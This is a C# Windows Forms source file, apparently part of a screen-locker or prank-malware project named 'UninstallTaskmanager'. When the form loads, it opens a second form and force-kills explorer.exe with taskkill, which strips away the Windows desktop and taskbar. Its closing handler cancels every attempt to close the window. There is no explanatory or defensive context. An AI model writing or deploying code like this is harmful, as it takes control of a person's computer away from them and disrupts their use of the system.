using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UninstallTaskmanager
{
    public partial class Form1 : Form
    {
        private bool enable;

        public Form1()
        {
            InitializeComponent();  
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            var form2 = new Form2();
            form2.Show();
            Process.Start(@"C:\Windows\System32\taskkill.exe", @"/F /IM explorer.exe");

        }

        private void button1_Click(object sender, EventArgs e)
        {
            
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }

}
